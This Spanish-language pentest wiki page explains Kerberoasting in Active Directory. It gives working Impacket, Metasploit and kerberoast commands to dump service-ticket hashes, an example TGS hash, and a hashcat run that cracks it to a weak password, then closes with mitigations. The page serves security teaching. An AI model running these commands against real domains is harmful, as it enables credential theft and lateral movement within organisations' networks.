# Kerberoasting

## Qué es?

El "Kerberoasting" es una técnica que los atacantes pueden usar para extraer tickets de servicio de Kerberos del Directorio Activo y luego intentar descifrar esos tickets fuera de línea para obtener las contraseñas en texto claro de las cuentas de servicio. A continuación, se describe cómo funciona y por qué es una vulnerabilidad en los entornos de AD:



El objetivo de Kerberoasting es recolectar <mark style="color:green;">**tickets TGS (Ticket Granting Tickets)**</mark> para servicios que se ejecutan en nombre de cuentas de usuario en el AD, no de cuentas de ordenador. Así, parte de estos tickets TGS están cifrados con claves derivadas de las contraseñas de los usuarios. Como consecuencia, sus credenciales podrían ser crackeadas offline. Se puede saber que una cuenta de usuario se está utilizando como servicio porque la propiedad "ServicePrincipalName" no es nula. Por lo tanto, para realizar Kerberoasting, sólo es necesaria una cuenta de dominio que pueda solicitar TGSs, que es cualquiera ya que no se requieren privilegios especiales.

### ¿Cómo funciona Kerberoasting?

1. **Ticket de Servicio**: En Kerberos, cuando un usuario quiere acceder a un servicio, solicita un ticket de servicio (TGS, Ticket Granting Service). Este ticket está cifrado con la contraseña de la cuenta de servicio del recurso al que el usuario quiere acceder.
2. **Extracción**: Un atacante no necesita privilegios especiales en el dominio para solicitar un ticket de servicio para cualquier cuenta de servicio. Una vez que el atacante tiene el ticket, puede exportarlo y llevarlo a otro lugar para intentar descifrarlo.
3. **Descifrado**: El atacante intentará descifrar el ticket fuera de línea utilizando herramientas de fuerza bruta o diccionarios. Si la contraseña de la cuenta de servicio es débil, el atacante podría descifrarla en un tiempo razonable.
4. **Compromiso**: Una vez que el atacante tiene la contraseña en texto claro de la cuenta de servicio, puede usarla para acceder a recursos o moverse lateralmente en la red.

### ¿Por qué es una vulnerabilidad?

* **Contraseñas débiles**: Las cuentas de servicio a menudo tienen contraseñas que raramente se cambian debido a preocupaciones operativas. Estas contraseñas estáticas, si son débiles, son vulnerables al descifrado.
* **Permisos Elevados**: Algunas cuentas de servicio pueden tener permisos elevados en el dominio o en sistemas individuales. Un atacante que comprometa una cuenta de servicio podría ganar un acceso significativo.
* **Falta de Monitorización**: Las solicitudes de tickets de servicio son operaciones normales en una red que utiliza Kerberos. Esto hace que sea difícil para los defensores detectar la actividad maliciosa.

#### Linux

{% code overflow="wrap" lineNumbers="true" %}
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted

GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast

# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
{% endcode %}



### Ejemplo

Esta vulnerabilidad fue previamente detectada con el resultado de ADPeas:

{% code overflow="wrap" %}
```powershell
[?] +++++ Searching for Kerberoastable User +++++
[!] Found Kerberoastable User 'roast.user':
sAMAccountName:                         roast.user
distinguishedName:                      CN=roast.user,CN=Users,DC=evilcorp,DC=corp
objectSid:                              S-1-5-21-1861162130-2580302541-221646211-1127
pwdLastSet:                             09/29/2023 02:03:36
lastLogonTimestamp:                     09/29/2023 02:03:36
userAccountControl:                     NORMAL_ACCOUNT

Hashcat usage: hashcat -m 13100
$krb5tgs$23$*roast.user$spartancybersec.corp$MSSQL/sql.evilcorp.corp*$A8DDCBEA1C6AEFE971C4BA672CBC9F32$8D3C7A07D449581969F4AB91BCDBA8FB06FFC89DB32DBF7E1A749CC4ED6B75F94081A66AC6800DF451243CCFFC99ECF84B329247D3C8ABF0E8B81684171DC99E1D1261BED8BEBB55FB094E1349FF0FC976C5F6DDA37F3BFF6263CCAA7A4A1466893493B92D5B45FD49D6793070134551E1CA418528F76521F4E76CA67FC27A36207507A5E6CC4F26211816F7455CFD3C9A32B1DE98C3F8C73CB70D25D8DDFC67084316856736B1D363177BA112F57096D188DB465A2A43B3FC3902D8BED0CC200A3273F8798FBA72A9585E6E2F728DEDE48CB678411064FDC0A58011A42B93301D4F98F47DD26E02DBECBF8FF7053472879C4105F66CACA699B62D6DFC70E91351AC5F8A778A622DACB54BF9B0E7D91D264A23D62014B2E5CB4088B5ED8F1F13C46F7CBA74D5BFB4207F3FE5FAB512CD3FE9E1A41AE02C710895F656CF8562B58F516E5B656162F22CBC9FA2E1FF5E58A8D19491D751D187AAC82810EEF259A8FB78373B37A192A8E8BB553D437E765B459A4AFB2F7BD6E0B4CC775244503407861063F697AA79212EB01CF96B81A8A18666F3E2EC108DC45C24EF8392F1144D7DBB797DFB0B5E078EB707573B1FCE19B7CF0196684899100E8716D6AAF790804D6F755832CB61666A982937193FF2681632448BD1BC670552458B6FF1ECD6FA7384CB1426BE5332CF363624D7E58E57EB6EAD8D5E637B5F4EB5FCF9660157C5A4D02BE879D341189067A771AED1ABB44C2FF194B21D64F50D6760B229FB8B654347AE9E22E3D41A93EAFD655B71C63BD25ECA4082F82719CAC5B3A22A085C994925C876054DADB4440A047E7A0E2290EB39D9FDE403285E25815EEB16AB9382C2039A97FE9A945B7C55B2191EE9BAF73A004916D2C36423A33CA219362B864793D5D6E4ED3B62FE9EB584DE00AEBE7FD83DEB19C8D78CD24F2F9915824E79A56EA87C0598DCD00AC8A38FFB28C8B3128845EFF57A52904D4E3E70E1F1D575E67B4CB93C4D467CBF4AB94280316C605795347C90B174C9B2B05F2B65E886538400A240C5ABC729CA0BC63A35675C1790A28C43EAC15EA322E29AF15CDE522BADA7A44F6D0CD7D73EA110E860C92CB839B27E6DF530F7D30C1C886150A4D51DAC872DF5210C81A9BD22092202E70C03EE542F3690B82781C18741FB747298A33C1226D671C5F1B00A7B5D1DD46C8C7184466EB83F5D38A1E1297436D9DD845704A489A38ABF11FFD996DF0A97D703A4D611DFEF66FFAAC80F5DA75FBA4A6D71416D193A15F1C195E8DAB0FD2EC8AB9EC0952657607965C8FE0B1C1AC66D8CB36804A497AFD146687BD3A337630ACF8707406E5B27C56665C5C6BB6CEECC6FBB95D3E472FA818BEE0F1A2466B8807E2D524746EF79B77A6E104FDA867BF23F80293BD7C64329663ED5F6FA02CF9658B4E2EFAC662502B3C21592BE2C4B1155AF70C07A87CB1143C2EDFE86FE75E70E21014E4E072EE49C1A1ACA6102F4FEE01FACBB2F4629988FA2B7CA4A91583604B81AE6FD06393C4A915362796ED4D780B1FEC6C7C510B43B4D68971FAEB491F84F48A48DCB680639BBA7551188102BF48DFE974D8A94B3F12A619526C2925A28B5E22653A03A6C97BA72478531FC76CD24E9AEAD779F07C6778D2212D77DF238DCBBB9E4234201D40824654CE64258DD8A6A82D5862DA71BE067FFADBE78282552EE5DDD0D33AADB0C6F06
```
{% endcode %}

Aunque tambien podrias descubrirla utilizando Rubeus.exe

Para crackear este hash podemos utilizar el siguiente comando:

{% hint style="info" %}
El resultado de un ataque de fuerza bruta siempre estará condicionado a tener un buen diccionario. Es recomendable generar diccionarios personalizados con patrones comunes
{% endhint %}

Primero almacenamos todo el hash en un archivo "hash-kerberoasting" y luego ejecutamos hashcat:

{% code overflow="wrap" %}
```bash
kali@kali=> hashcat -m 13100 --force hash-kerberoasting /usr/share/wordlists/rockyou.txt 
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*roast.user$spartancybersec.corp$MSSQL/sql.evilcorp.corp*$a8ddcbea1c6aefe971c4ba672cbc9f32$8d3c7a07d449581969f4ab91bcdba8fb06ffc89db32dbf7e1a749cc4ed6b75f94081a66ac6800df451243ccffc99ecf84b329247d3c8abf0e8b81684171dc99e1d1261bed8bebb55fb094e1349ff0fc976c5f6dda37f3bff6263ccaa7a4a1466893493b92d5b45fd49d6793070134551e1ca418528f76521f4e76ca67fc27a36207507a5e6cc4f26211816f7455cfd3c9a32b1de98c3f8c73cb70d25d8ddfc67084316856736b1d363177ba112f57096d188db465a2a43b3fc3902d8bed0cc200a3273f8798fba72a9585e6e2f728dede48cb678411064fdc0a58011a42b93301d4f98f47dd26e02dbecbf8ff7053472879c4105f66caca699b62d6dfc70e91351ac5f8a778a622dacb54bf9b0e7d91d264a23d62014b2e5cb4088b5ed8f1f13c46f7cba74d5bfb4207f3fe5fab512cd3fe9e1a41ae02c710895f656cf8562b58f516e5b656162f22cbc9fa2e1ff5e58a8d19491d751d187aac82810eef259a8fb78373b37a192a8e8bb553d437e765b459a4afb2f7bd6e0b4cc775244503407861063f697aa79212eb01cf96b81a8a18666f3e2ec108dc45c24ef8392f1144d7dbb797dfb0b5e078eb707573b1fce19b7cf0196684899100e8716d6aaf790804d6f755832cb61666a982937193ff2681632448bd1bc670552458b6ff1ecd6fa7384cb1426be5332cf363624d7e58e57eb6ead8d5e637b5f4eb5fcf9660157c5a4d02be879d341189067a771aed1abb44c2ff194b21d64f50d6760b229fb8b654347ae9e22e3d41a93eafd655b71c63bd25eca4082f82719cac5b3a22a085c994925c876054dadb4440a047e7a0e2290eb39d9fde403285e25815eeb16ab9382c2039a97fe9a945b7c55b2191ee9baf73a004916d2c36423a33ca219362b864793d5d6e4ed3b62fe9eb584de00aebe7fd83deb19c8d78cd24f2f9915824e79a56ea87c0598dcd00ac8a38ffb28c8b3128845eff57a52904d4e3e70e1f1d575e67b4cb93c4d467cbf4ab94280316c605795347c90b174c9b2b05f2b65e886538400a240c5abc729ca0bc63a35675c1790a28c43eac15ea322e29af15cde522bada7a44f6d0cd7d73ea110e860c92cb839b27e6df530f7d30c1c886150a4d51dac872df5210c81a9bd22092202e70c03ee542f3690b82781c18741fb747298a33c1226d671c5f1b00a7b5d1dd46c8c7184466eb83f5d38a1e1297436d9dd845704a489a38abf11ffd996df0a97d703a4d611dfef66ffaac80f5da75fba4a6d71416d193a15f1c195e8dab0fd2ec8ab9ec0952657607965c8fe0b1c1ac66d8cb36804a497afd146687bd3a337630acf8707406e5b27c56665c5c6bb6ceecc6fbb95d3e472fa818bee0f1a2466b8807e2d524746ef79b77a6e104fda867bf23f80293bd7c64329663ed5f6fa02cf9658b4e2efac662502b3c21592be2c4b1155af70c07a87cb1143c2edfe86fe75e70e21014e4e072ee49c1a1aca6102f4fee01facbb2f4629988fa2b7ca4a91583604b81ae6fd06393c4a915362796ed4d780b1fec6c7c510b43b4d68971faeb491f84f48a48dcb680639bba7551188102bf48dfe974d8a94b3f12a619526c2925a28b5e22653a03a6c97ba72478531fc76cd24e9aead779f07c6778d2212d77df238dcbbb9e4234201d40824654ce64258dd8a6a82d5862da71be067ffadbe78282552ee5ddd0d33aadb0c6f06:Password@1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*roast.user$evilcorp.corp$MSSQL/...0c6f06
Time.Started.....: Fri Sep 29 02:52:17 2023, (5 secs)
Time.Estimated...: Fri Sep 29 02:52:22 2023, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   531.2 kH/s (0.45ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2103296/14344385 (14.66%)
Rejected.........: 0/2103296 (0.00%)
Restore.Point....: 2103040/14344385 (14.66%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: PeeKaBoo!NYY -> Passp0rt
Hardware.Mon.#1..: Util:100%
```
{% endcode %}

<mark style="color:green;">**La contraseña para este caso era débil y es: Password@1**</mark>

#### Mitigación:

* **Utilizar Contraseñas Fuertes**: Asegúrate de que todas las cuentas de servicio tengan contraseñas largas y complejas, lo que hará que el proceso de descifrado sea mucho más difícil y tome más tiempo.
* **Rotar Contraseñas**: Cambia las contraseñas de las cuentas de servicio regularmente.
* **Monitorización**: Monitorea las solicitudes anómalas de tickets de servicio y los intentos de uso de cuentas de servicio.
* **Uso de AES**: Usa AES en lugar de RC4 para cifrar los tickets de Kerberos, ya que AES es más resistente a este tipo de ataque.





## Referencias

{% embed url="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast" %}

{% embed url="https://www.crackmapexec.wiki/ldap-protocol/kerberoasting" %}
